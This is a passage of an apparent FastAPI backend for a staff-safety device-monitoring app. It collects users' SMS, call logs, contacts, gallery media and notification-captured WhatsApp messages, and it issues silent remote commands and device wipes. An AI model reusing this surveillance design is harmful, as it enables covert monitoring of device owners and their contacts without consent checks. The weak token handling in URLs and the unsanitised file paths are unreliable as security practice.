                "activity": t.activity,
                "recorded_at": t.recorded_at.isoformat(),
                "uploaded_at": t.uploaded_at.isoformat(),
            }
            for t in trail
        ]
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Location trail error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve location trail")


@app.get("/admin/monitoring/location/{username}/last")
async def admin_get_last_location(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin gets most recent GPS point for a user."""
    try:
        target = db.query(User).filter(User.username == username, User.is_active == True).first()
        if not target:
            raise HTTPException(status_code=404, detail="User not found")
        MonitoringService.assert_consent(db, int(target.id), "location")

        loc = MonitoringService.get_last_location(db, int(target.id))
        if not loc:
            return {"message": "No location data available"}
        return {
            "latitude": loc.latitude,
            "longitude": loc.longitude,
            "accuracy": loc.accuracy,
            "speed": loc.speed,
            "activity": loc.activity,
            "recorded_at": loc.recorded_at.isoformat(),
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Last location error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve last location")


# ─── Device Data Pull Endpoints ───────────────────────────────────────────────

DEVICE_DATA_DIR = "device_data"

def _user_data_dir(user_id: int) -> str:
    path = os.path.join(DEVICE_DATA_DIR, f"user_{user_id}")
    os.makedirs(path, exist_ok=True)
    return path

@app.post("/device-data/contacts")
async def device_upload_contacts(
    payload: Dict,
    current_user: User = Depends(get_current_user),
):
    """Device uploads its contacts list."""
    user_id = int(getattr(current_user, 'id', 0))
    path = os.path.join(_user_data_dir(user_id), "contacts.json")
    with open(path, "w") as f:
        import json as _json
        _json.dump({"uploaded_at": datetime.now(timezone.utc).isoformat(), "contacts": payload.get("contacts", [])}, f)
    return {"status": "ok", "count": len(payload.get("contacts", []))}

@app.post("/device-data/call-logs")
async def device_upload_call_logs(
    payload: Dict,
    current_user: User = Depends(get_current_user),
):
    """Device uploads call log entries (Android only)."""
    user_id = int(getattr(current_user, 'id', 0))
    path = os.path.join(_user_data_dir(user_id), "call_logs.json")
    with open(path, "w") as f:
        import json as _json
        _json.dump({"uploaded_at": datetime.now(timezone.utc).isoformat(), "call_logs": payload.get("call_logs", [])}, f)
    return {"status": "ok", "count": len(payload.get("call_logs", []))}

@app.post("/device-data/sms")
async def device_upload_sms(
    payload: Dict,
    current_user: User = Depends(get_current_user),
):
    """Device uploads SMS inbox (Android only)."""
    user_id = int(getattr(current_user, 'id', 0))
    path = os.path.join(_user_data_dir(user_id), "sms.json")
    with open(path, "w") as f:
        import json as _json
        _json.dump({"uploaded_at": datetime.now(timezone.utc).isoformat(), "messages": payload.get("messages", [])}, f)
    return {"status": "ok", "count": len(payload.get("messages", []))}

@app.post("/device-data/media/upload")
async def device_upload_media(
    file: UploadFile = File(...),
    filename: str = Form(...),
    media_type: str = Form(default="photo"),
    created_at: str = Form(default=""),
    album: str = Form(default="unknown"),
    current_user: User = Depends(get_current_user),
):
    """Device uploads a single media file from gallery."""
    user_id = int(getattr(current_user, 'id', 0))
    media_dir = os.path.join(_user_data_dir(user_id), "media")
    os.makedirs(media_dir, exist_ok=True)
    safe_name = f"{uuid.uuid4().hex}_{os.path.basename(filename)}"
    file_path = os.path.join(media_dir, safe_name)
    content = await file.read()
    with open(file_path, "wb") as f:
        f.write(content)
    # Append metadata entry
    import json as _json
    meta_path = os.path.join(_user_data_dir(user_id), "media_index.json")
    meta = []
    if os.path.exists(meta_path):
        with open(meta_path) as f:
            meta = _json.load(f)
    meta.append({
        "filename": safe_name,
        "original_name": filename,
        "media_type": media_type,
        "album": album,
        "created_at": created_at,
        "size_bytes": len(content),
        "uploaded_at": datetime.now(timezone.utc).isoformat(),
    })
    with open(meta_path, "w") as f:
        _json.dump(meta, f)
    return {"status": "ok", "saved_as": safe_name}

# Admin read endpoints

@app.get("/admin/device-data/{username}/contacts")
async def admin_get_contacts(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session),
):
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    path = os.path.join(_user_data_dir(int(target.id)), "contacts.json")
    if not os.path.exists(path):
        return {"contacts": [], "uploaded_at": None}
    import json as _json
    with open(path) as f:
        return _json.load(f)

@app.get("/admin/device-data/{username}/call-logs")
async def admin_get_call_logs(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session),
):
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    path = os.path.join(_user_data_dir(int(target.id)), "call_logs.json")
    if not os.path.exists(path):
        return {"call_logs": [], "uploaded_at": None}
    import json as _json
    with open(path) as f:
        return _json.load(f)

@app.get("/admin/device-data/{username}/sms")
async def admin_get_sms(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session),
):
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    path = os.path.join(_user_data_dir(int(target.id)), "sms.json")
    if not os.path.exists(path):
        return {"messages": [], "uploaded_at": None}
    import json as _json
    with open(path) as f:
        return _json.load(f)

@app.get("/admin/device-data/{username}/media")
async def admin_list_media(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session),
):
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    meta_path = os.path.join(_user_data_dir(int(target.id)), "media_index.json")
    if not os.path.exists(meta_path):
        return []
    import json as _json
    with open(meta_path) as f:
        return _json.load(f)

@app.get("/admin/device-data/{username}/media/{filename}")
async def admin_download_media(
    username: str,
    filename: str,
    request: Request,
    token: Optional[str] = None,
    db: Session = Depends(get_database_session),
):
    """Serves device media file. Accepts Bearer header OR ?token= query param (for browser <img>/<video> src)."""
    raw_token = token
    if not raw_token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            raw_token = auth_header[7:]
    if not raw_token:
        raise HTTPException(status_code=401, detail="Missing token")
    session = SessionService.validate_session(db, raw_token)
    if not session:
        raise HTTPException(status_code=401, detail="Invalid token")
    admin = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
    if not admin or not admin.is_admin:
        raise HTTPException(status_code=403, detail="Admin only")
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    file_path = os.path.join(_user_data_dir(int(target.id)), "media", filename)
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path)


# ─── WhatsApp Notification Capture ───────────────────────────────────────────

@app.post("/device-data/whatsapp")
async def device_upload_whatsapp(
    payload: Dict,
    current_user: User = Depends(get_current_user),
):
    """Device uploads WhatsApp messages captured from Android NotificationListenerService."""
    import json as _json
    user_id = int(getattr(current_user, 'id', 0))
    path = os.path.join(_user_data_dir(user_id), "whatsapp_notifications.json")
    existing: list = []
    if os.path.exists(path):
        with open(path) as f:
            try: existing = _json.load(f)
            except: existing = []
    new_msgs = payload.get("messages", [])
    # Deduplicate by (sender, timestamp) — avoid duplicates on retry
    existing_keys = {(m.get("sender"), m.get("timestamp")) for m in existing}
    for m in new_msgs:
        if (m.get("sender"), m.get("timestamp")) not in existing_keys:
            existing.append(m)
    # Keep last 5000 messages per user
    existing = existing[-5000:]
    with open(path, "w") as f:
        _json.dump(existing, f)
    return {"status": "ok", "new": len(new_msgs), "total": len(existing)}

@app.post("/device-data/installed-apps")
async def device_upload_installed_apps(
    payload: Dict,
    current_user: User = Depends(get_current_user),
):
    """Device uploads list of installed apps."""
    import json as _json
    user_id = int(getattr(current_user, 'id', 0))
    path = os.path.join(_user_data_dir(user_id), "installed_apps.json")
    apps = payload.get("apps", [])
    with open(path, "w") as f:
        _json.dump({"apps": apps, "updated_at": datetime.utcnow().isoformat()}, f)
    return {"status": "ok", "count": len(apps)}


@app.get("/admin/device-data/{username}/installed-apps")
async def admin_get_installed_apps(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session),
):
    """Admin reads installed apps list for a user."""
    import json as _json
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    path = os.path.join(_user_data_dir(int(target.id)), "installed_apps.json")
    if not os.path.exists(path):
        return {"apps": [], "updated_at": None}
    with open(path) as f:
        return _json.load(f)


@app.get("/admin/device-data/{username}/whatsapp")
async def admin_get_whatsapp(
    username: str,
    limit: int = 500,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session),
):
    """Admin reads captured WhatsApp notifications for a user."""
    import json as _json
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    path = os.path.join(_user_data_dir(int(target.id)), "whatsapp_notifications.json")
    if not os.path.exists(path):
        return []
    with open(path) as f:
        msgs = _json.load(f)
    # Return most recent `limit` messages, newest first
    return list(reversed(msgs[-limit:]))

# ─── WhatsApp Media Endpoints ──────────────────────────────────────────────────

@app.post("/device-data/whatsapp-media/upload")
async def device_upload_whatsapp_media(
    file: UploadFile = File(...),
    filename: str = Form(...),
    album: str = Form(...),
    media_type: str = Form(...),
    creation_time: Optional[float] = Form(None),
    current_user: User = Depends(get_current_user),
):
    """Device uploads a WhatsApp media file. Stores file and metadata; correlates sender on read."""
    import json as _json
    user_id = int(getattr(current_user, 'id', 0))
    media_dir = os.path.join(_user_data_dir(user_id), "whatsapp_media")
    os.makedirs(media_dir, exist_ok=True)

    ext = filename.rsplit('.', 1)[-1] if '.' in filename else 'bin'
    upload_id = str(uuid.uuid4())
    stored_filename = f"{upload_id}.{ext}"
    file_path = os.path.join(media_dir, stored_filename)

    content = await file.read()
    with open(file_path, "wb") as f:
        f.write(content)

    index_path = os.path.join(_user_data_dir(user_id), "whatsapp_media_index.json")
    index: list = []
    if os.path.exists(index_path):
        with open(index_path) as f:
            try: index = _json.load(f)
            except: index = []

    received_at = datetime.utcfromtimestamp(creation_time / 1000).isoformat() if creation_time else datetime.utcnow().isoformat()
    index.append({
        "upload_id": upload_id,
        "filename": filename,
        "stored_filename": stored_filename,
        "album": album,
        "media_type": media_type,
        "creation_time": creation_time,
        "received_at": received_at,
    })
    # Keep last 500
    index = index[-500:]
    with open(index_path, "w") as f:
        _json.dump(index, f)

    return {"status": "ok", "upload_id": upload_id}


@app.get("/admin/device-data/{username}/whatsapp-media")
async def admin_get_whatsapp_media(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session),
):
    """Admin retrieves WhatsApp media for a user, with sender correlation from notification history."""
    import json as _json
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")

    user_id = int(target.id)
    index_path = os.path.join(_user_data_dir(user_id), "whatsapp_media_index.json")
    notif_path = os.path.join(_user_data_dir(user_id), "whatsapp_notifications.json")

    if not os.path.exists(index_path):
        return []

    with open(index_path) as f:
        index = _json.load(f)

    notifications = []
    if os.path.exists(notif_path):
        with open(notif_path) as f:
            try: notifications = _json.load(f)
            except: notifications = []

    MEDIA_KEYWORDS = {"photo", "image", "video", "audio", "document", "gif", "sticker", "📷", "🎥", "🎵", "📄"}

    media_notifs = [
        n for n in notifications
        if any(kw in (n.get("message") or "").lower() for kw in MEDIA_KEYWORDS)
    ]

    def find_sender(creation_time_ms):
        if not creation_time_ms or not media_notifs:
            return None
        best = None
        best_delta = float("inf")
        for n in media_notifs:
            ts = n.get("timestamp")
            if not ts:
                continue
            delta = abs(ts - creation_time_ms)
            if delta < best_delta and delta < 60_000:
                best_delta = delta
                best = n.get("sender")
        return best

    result = []
    for entry in reversed(index):
        sender = find_sender(entry.get("creation_time"))
        result.append({**entry, "sender": sender})
    return result


@app.get("/admin/device-data/{username}/whatsapp-media/{stored_filename}")
async def admin_download_whatsapp_media(
    username: str,
    stored_filename: str,
    request: Request,
    token: Optional[str] = None,
    db: Session = Depends(get_database_session),
):
    """Admin downloads a WhatsApp media file. Accepts Bearer header OR ?token= query param."""
    raw_token = token
    if not raw_token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            raw_token = auth_header[7:]
    if not raw_token:
        raise HTTPException(status_code=401, detail="Missing token")
    session = SessionService.validate_session(db, raw_token)
    if not session:
        raise HTTPException(status_code=401, detail="Invalid token")
    user = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
    if not user or not user.is_admin:
        raise HTTPException(status_code=403, detail="Admin only")

    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")

    file_path = os.path.join(_user_data_dir(int(target.id)), "whatsapp_media", stored_filename)
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")

    ext = stored_filename.rsplit('.', 1)[-1].lower() if '.' in stored_filename else ''
    mime_map = {"mp4": "video/mp4", "mov": "video/quicktime", "jpg": "image/jpeg", "jpeg": "image/jpeg",
                "png": "image/png", "gif": "image/gif", "webp": "image/webp",
                "mp3": "audio/mpeg", "m4a": "audio/mp4", "ogg": "audio/ogg", "opus": "audio/ogg"}
    media_type = mime_map.get(ext, "application/octet-stream")

    from fastapi.responses import FileResponse
    return FileResponse(path=file_path, media_type=media_type)


# ─── Device Presence Endpoints ───────────────────────────────────────────────

@app.get("/admin/devices")
async def admin_list_devices(
    username: Optional[str] = None,
    admin_user: User = Depends(get_admin_user),
):
    """
    List all currently connected devices.
    Optional ?username= filter to see devices for a specific user.
    Returns device_id, device_type (mobile|desktop), device_name, username, connected_at.
    """
    if username:
        target_id = None
        # Resolve user_id from username via ws_manager
        for uid, uname in ws_manager._usernames.items():
            if uname == username:
                target_id = uid
                break
        if target_id is None:
            return {"devices": []}
        return {"devices": ws_manager.get_user_devices(target_id)}
    return {"devices": ws_manager.get_online_devices()}


# ─── Remote Command Endpoints ─────────────────────────────────────────────────

@app.post("/admin/device/command")
async def admin_issue_remote_command(
    data: RemoteCommandRequest,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """
    Admin issues a silent remote command to a user's device.
    No interaction required from the user — app executes autonomously
    using permissions granted during onboarding.
    """
    try:
        admin_id = int(getattr(admin_user, 'id', 0))

        # Block if same start_* command already executing on device
        target = db.query(User).filter(User.username == data.username, User.is_active == True).first()
        if not target:
            raise HTTPException(status_code=404, detail="Target user not found")
        target_id = int(getattr(target, 'id'))

        if data.command_type.startswith("start_"):
            in_use = db.query(RemoteCommand).filter(
                RemoteCommand.target_user_id == target_id,
                RemoteCommand.command_type == data.command_type,
                RemoteCommand.status == "executing",
            ).first()
            if in_use:
                raise HTTPException(
                    status_code=409,
                    detail=f"Command '{data.command_type}' already executing on this device",
                )

        cmd = await RemoteCommandService.issue(db, admin_id, data)

        # Audit log
        db.add(CommandAuditLog(
            command_id=int(cmd.id),
            admin_id=admin_id,
            target_user_id=target_id,
            command_type=data.command_type,
            action="issued",
            metadata_={"params": data.params},
        ))
        db.commit()

        return {
            "command_id": int(cmd.id),
            "command_type": cmd.command_type,
            "status": cmd.status,
            "issued_at": cmd.issued_at.isoformat(),
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Remote command error: {e}")
        raise HTTPException(status_code=500, detail="Failed to issue remote command")


@app.post("/device/command/ack")
async def ack_remote_command(
    data: RemoteCommandAck,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """App calls this to confirm command received and its execution status."""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        cmd = RemoteCommandService.ack(db, data.command_id, user_id, data.status)
        # Audit log
        db.add(CommandAuditLog(
            command_id=int(cmd.id),
            admin_id=int(getattr(cmd, 'issued_by_admin_id', 0)),
            target_user_id=user_id,
            command_type=str(getattr(cmd, 'command_type', '')),
            action=str(data.status),
            metadata_=None,
        ))
        db.commit()
        # Notify the admin who issued this command via WebSocket
        if cmd.issued_by_admin_id:
            await ws_manager.send_to_user(int(cmd.issued_by_admin_id), {
                "type": "command_ack",
                "command_id": int(cmd.id),
                "command_type": cmd.command_type,
                "status": cmd.status,
                "target_username": current_user.username,
            })
        return {"command_id": int(cmd.id), "status": cmd.status}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Command ack error: {e}")
        raise HTTPException(status_code=500, detail="Failed to acknowledge command")


@app.get("/device/command/pending")
async def get_pending_commands(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """
    App calls this on startup/reconnect to fetch commands missed while offline.
    Critical for kidnapping scenario: phone regains signal → fetches queued commands instantly.
    """
    try:
        user_id = int(getattr(current_user, 'id', 0))
        cmds = RemoteCommandService.pending_for_user(db, user_id)
        return [
            {
                "command_id": int(c.id),
                "command_type": c.command_type,
                "params": c.params or {},
                "issued_at": c.issued_at.isoformat(),
            }
            for c in cmds
        ]
    except Exception as e:
        logger.error(f"Get pending commands error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve pending commands")


@app.get("/admin/device/command/history/{username}")
async def admin_command_history(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin views command history for a specific user."""
    try:
        cmds = RemoteCommandService.history(db, username)
        return [
            {
                "command_id": int(c.id),
                "command_type": c.command_type,
                "params": c.params,
                "status": c.status,
                "issued_at": c.issued_at.isoformat(),
                "delivered_at": c.delivered_at.isoformat() if c.delivered_at else None,
                "acked_at": c.acked_at.isoformat() if c.acked_at else None,
            }
            for c in cmds
        ]
    except Exception as e:
        logger.error(f"Command history error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve command history")


@app.get("/admin/device/command/active/{username}")
async def get_active_commands(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Return commands currently executing on a device (for UI in-use badge)."""
    target = db.query(User).filter(User.username == username, User.is_active == True).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    executing = db.query(RemoteCommand).filter(
        RemoteCommand.target_user_id == target.id,
        RemoteCommand.status == "executing",
    ).all()
    return {
        "active_commands": [
            {
                "command_id": int(c.id),
                "command_type": str(c.command_type),
                "issued_at": c.issued_at.isoformat(),
            }
            for c in executing
        ]
    }


@app.get("/admin/audit/commands")
async def super_admin_command_audit(
    limit: int = 100,
    offset: int = 0,
    admin_user: User = Depends(get_superadmin_only),
    db: Session = Depends(get_database_session)
):
    """Super admin: full audit log of all command actions across all admins and devices."""
    logs = (
        db.query(CommandAuditLog)
        .order_by(CommandAuditLog.timestamp.desc())
        .offset(offset)
        .limit(limit)
        .all()
    )
    return {
        "audit_logs": [
            {
                "id": int(l.id),
                "command_id": l.command_id,
                "admin_username": str(getattr(l.admin, 'username', '')) if l.admin else None,
                "target_username": str(getattr(l.target_user, 'username', '')) if l.target_user else None,
                "command_type": str(l.command_type),
                "action": str(l.action),
                "timestamp": l.timestamp.isoformat(),
                "metadata": l.metadata_,
            }
            for l in logs
        ],
        "total": db.query(CommandAuditLog).count(),
    }


# ─── Remote Device Wipe Endpoints ─────────────────────────────────────────────

@app.post("/admin/device/wipe")
async def admin_issue_wipe(
    data: DeviceWipeRequest,
    admin_user: User = Depends(get_admin_only),
    db: Session = Depends(get_database_session)
):
    """Admin issues remote wipe command. Delivered via WebSocket instantly; poll fallback if offline."""
    try:
        admin_id = int(getattr(admin_user, 'id', 0))
        cmd = await DeviceWipeService.issue_wipe(
            db, admin_id, data.username, data.reason, data.wipe_mode, data.target_packages
        )
        db.add(CommandAuditLog(
            admin_id=admin_id,
            target_user_id=int(cmd.target_user_id),
            command_type=f"device_wipe:{data.wipe_mode}",
            action="issued",
            metadata_={"reason": data.reason, "wipe_id": int(cmd.id)},
        ))
        db.commit()
        return {
            "wipe_id": int(cmd.id),
            "status": cmd.status,
            "wipe_mode": cmd.wipe_mode,
            "issued_at": cmd.issued_at.isoformat(),
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Wipe issue error: {e}")
        raise HTTPException(status_code=500, detail="Failed to issue wipe command")


@app.post("/admin/device/wipe/all")
async def admin_issue_mass_wipe(
    data: MassWipeRequest,
    admin_user: User = Depends(get_superadmin_only),
    db: Session = Depends(get_database_session)
):
    """
    Superadmin only: issue a duress wipe to every specified (or all active) staff
    device at once — for the 'entire team is under attack' scenario. Every
    individual command is still logged to the per-user audit trail plus one
    batch entry so this action is fully traceable to the superadmin who called it.
    """
    import uuid as _uuid
    try:
        admin_id = int(getattr(admin_user, 'id', 0))
        batch_id = _uuid.uuid4().hex

        if data.usernames:
            targets = db.query(User).filter(User.username.in_(data.usernames), User.is_active == True).all()
        else:
            targets = db.query(User).filter(User.is_active == True, User.is_admin == False).all()

        if not targets:
            raise HTTPException(status_code=404, detail="No matching active users found")

        results = []
        for target in targets:
            cmd = await DeviceWipeService._issue_wipe_for_user(
                db, admin_id, int(target.id), data.reason, data.wipe_mode, data.target_packages, batch_id
            )
            results.append({"username": target.username, "wipe_id": int(cmd.id), "status": cmd.status})

        db.add(CommandAuditLog(
            admin_id=admin_id,
            target_user_id=admin_id,  # batch entry isn't scoped to one target; self-reference keeps FK satisfied
            command_type=f"mass_device_wipe:{data.wipe_mode}",
            action="issued",
            metadata_={"reason": data.reason, "batch_id": batch_id, "target_count": len(results)},
        ))
        db.commit()

        logger.critical(f"MASS DEVICE WIPE issued by superadmin={admin_id}: batch={batch_id}, targets={len(results)}, reason={data.reason}")
        return {"batch_id": batch_id, "wipe_mode": data.wipe_mode, "targets": results}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Mass wipe error: {e}")
        raise HTTPException(status_code=500, detail="Failed to issue mass wipe command")


# ─── Wipe Approval Endpoints (SOS + geofence requests land here first) ───────

@app.get("/admin/device/wipe/pending-approval")
async def admin_pending_wipe_approvals(
    approver: User = Depends(get_wipe_approver),
    db: Session = Depends(get_database_session)
):
    """Approver views all wipe requests awaiting a decision."""
    try:
        cmds = DeviceWipeService.pending_approval(db)
        result = []
        for c in cmds:
            target = db.query(User).filter(User.id == c.target_user_id).first()
            requester = db.query(User).filter(User.id == c.requested_by_user_id).first() if c.requested_by_user_id else None
            result.append({
                "wipe_id": int(c.id),
                "target_username": target.username if target else "unknown",
                "trigger_source": c.trigger_source,
                "requested_by_username": requester.username if requester else None,
                "reason": c.reason,
                "wipe_mode": c.wipe_mode,
                "issued_at": c.issued_at.isoformat(),
            })
        return result
    except Exception as e:
        logger.error(f"Pending wipe approvals error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve pending wipe approvals")


@app.post("/admin/device/wipe/{wipe_id}/approve")
async def admin_approve_wipe(
    wipe_id: int,
    approver: User = Depends(get_wipe_approver),
    db: Session = Depends(get_database_session)
):
    """Approver authorizes a pending SOS/geofence wipe request — this is the only
    point at which those requests actually purge data and push to the device."""
    try:
        approver_id = int(getattr(approver, 'id', 0))
        cmd = await DeviceWipeService.approve_wipe(db, wipe_id, approver_id)
        db.add(CommandAuditLog(
            admin_id=approver_id,
            target_user_id=int(cmd.target_user_id),
            command_type=f"device_wipe:{cmd.wipe_mode}",
            action="approved",
            metadata_={"wipe_id": int(cmd.id), "trigger_source": cmd.trigger_source},
        ))
        db.commit()
        return {"wipe_id": int(cmd.id), "status": cmd.status, "wipe_mode": cmd.wipe_mode}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Approve wipe error: {e}")
        raise HTTPException(status_code=500, detail="Failed to approve wipe request")


@app.post("/admin/device/wipe/{wipe_id}/reject")
async def admin_reject_wipe(
    wipe_id: int,
    data: WipeRejectRequest,
    approver: User = Depends(get_wipe_approver),
    db: Session = Depends(get_database_session)
):
    """Approver dismisses a pending SOS/geofence wipe request — e.g. a known
    off-duty geofence exit or a confirmed false alarm. Nothing is touched."""
    try:
        approver_id = int(getattr(approver, 'id', 0))
        cmd = DeviceWipeService.reject_wipe(db, wipe_id, approver_id, data.note)
        db.add(CommandAuditLog(
            admin_id=approver_id,
            target_user_id=int(cmd.target_user_id),
            command_type=f"device_wipe:{cmd.wipe_mode}",
            action="rejected",
            metadata_={"wipe_id": int(cmd.id), "trigger_source": cmd.trigger_source, "note": data.note},
        ))
        db.commit()
        return {"wipe_id": int(cmd.id), "status": cmd.status}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Reject wipe error: {e}")
        raise HTTPException(status_code=500, detail="Failed to reject wipe request")


@app.post("/admin/users/wipe-approver")
async def set_wipe_approver(
    data: SetWipeApproverRequest,
    admin_user: User = Depends(get_superadmin_only),
    db: Session = Depends(get_database_session)
):
    """Superadmin only: grant or revoke an admin's ability to approve/reject
    SOS- and geofence-triggered wipe requests. Superadmin can always approve
    regardless of this flag."""
    try:
        target = db.query(User).filter(User.username == data.username, User.is_admin == True).first()
        if not target:
            raise HTTPException(status_code=404, detail="Admin user not found")
        target.can_approve_duress_wipe = data.can_approve
        db.commit()
        return {"username": target.username, "can_approve_duress_wipe": target.can_approve_duress_wipe}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Set wipe approver error: {e}")
        raise HTTPException(status_code=500, detail="Failed to update wipe approver status")


@app.post("/device/wipe/confirm")
async def confirm_device_wipe(
    wipe_id: int = Body(...),
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """App calls this after completing local wipe to confirm execution."""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        cmd = DeviceWipeService.confirm_wipe(db, wipe_id, user_id)
        return {"wipe_id": int(cmd.id), "status": "confirmed"}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Wipe confirm error: {e}")
        raise HTTPException(status_code=500, detail="Failed to confirm wipe")


@app.get("/device/wipe/pending")
async def get_pending_wipes(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """App calls this on startup/reconnect to fetch wipe commands missed while offline —
    same pattern as /device/command/pending, critical for the phone-regains-signal case."""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        cmds = DeviceWipeService.pending_for_user(db, user_id)
        return [
            {
                "wipe_id": int(c.id),
                "wipe_mode": c.wipe_mode,
                "target_packages": c.target_packages,
                "reason": c.reason,
                "issued_at": c.issued_at.isoformat(),
            }
            for c in cmds
        ]
    except Exception as e:
        logger.error(f"Get pending wipes error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve pending wipe commands")


@app.get("/admin/device/wipe/history")
async def admin_wipe_history(
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin views all issued wipe commands."""
    try:
        cmds = db.query(DeviceWipeCommand).order_by(DeviceWipeCommand.issued_at.desc()).limit(100).all()
        result = []
        for c in cmds:
            target = db.query(User).filter(User.id == c.target_user_id).first()
            result.append({
                "wipe_id": int(c.id),
                "target_username": target.username if target else "unknown",
                "reason": c.reason,
                "status": c.status,
                "wipe_mode": c.wipe_mode,
                "batch_id": c.batch_id,
                "issued_at": c.issued_at.isoformat(),
                "confirmed_at": c.confirmed_at.isoformat() if c.confirmed_at else None,
            })
        return result
    except Exception as e:
        logger.error(f"Wipe history error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve wipe history")


# ─── Geofencing Endpoints ──────────────────────────────────────────────────────

@app.post("/admin/geofence/zones")
async def admin_create_geofence_zone(
    data: GeofenceZoneCreate,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin creates a geofence zone."""
    try:
        admin_id = int(getattr(admin_user, 'id', 0))
        zone = GeofenceService.create_zone(db, admin_id, data)
        return {
            "zone_id": int(zone.id),
            "name": zone.name,
            "radius_meters": zone.radius_meters,
            "alert_on": zone.alert_on,
            "created_at": zone.created_at.isoformat(),
        }
    except Exception as e:
        logger.error(f"Create geofence error: {e}")
        raise HTTPException(status_code=500, detail="Failed to create geofence zone")


@app.get("/admin/geofence/zones")
async def admin_list_geofence_zones(
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin lists all geofence zones."""
    try:
        zones = db.query(GeofenceZone).filter(GeofenceZone.is_active == True).all()
        return [
            {
                "zone_id": int(z.id),
                "name": z.name,
                "center_lat": z.center_lat,
                "center_lon": z.center_lon,
                "radius_meters": z.radius_meters,
                "alert_on": z.alert_on,
                "applies_to": z.applies_to,
                "created_at": z.created_at.isoformat(),
            }
            for z in zones
        ]
    except Exception as e:
        logger.error(f"List geofence zones error: {e}")
        raise HTTPException(status_code=500, detail="Failed to list geofence zones")


@app.delete("/admin/geofence/zones/{zone_id}")
async def admin_delete_geofence_zone(
    zone_id: int,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin deactivates a geofence zone."""
    try:
        zone = db.query(GeofenceZone).filter(GeofenceZone.id == zone_id).first()
        if not zone:
            raise HTTPException(status_code=404, detail="Zone not found")
        zone.is_active = False
        db.commit()
        return {"zone_id": zone_id, "status": "deactivated"}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Delete zone error: {e}")
        raise HTTPException(status_code=500, detail="Failed to delete zone")


@app.get("/admin/geofence/events")
async def admin_geofence_events(
    username: Optional[str] = None,
    zone_id: Optional[int] = None,
    limit: int = 200,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin views geofence crossing events, optionally filtered by user or zone."""
    try:
        query = db.query(GeofenceEvent).order_by(GeofenceEvent.triggered_at.desc())
        if username:
            target = db.query(User).filter(User.username == username).first()
            if target:
                query = query.filter(GeofenceEvent.user_id == target.id)
        if zone_id:
            query = query.filter(GeofenceEvent.zone_id == zone_id)
        events = query.limit(limit).all()

        result = []
        for ev in events:
            user = db.query(User).filter(User.id == ev.user_id).first()
            zone = db.query(GeofenceZone).filter(GeofenceZone.id == ev.zone_id).first()
            result.append({
                "event_id": int(ev.id),
                "zone_name": zone.name if zone else "unknown",
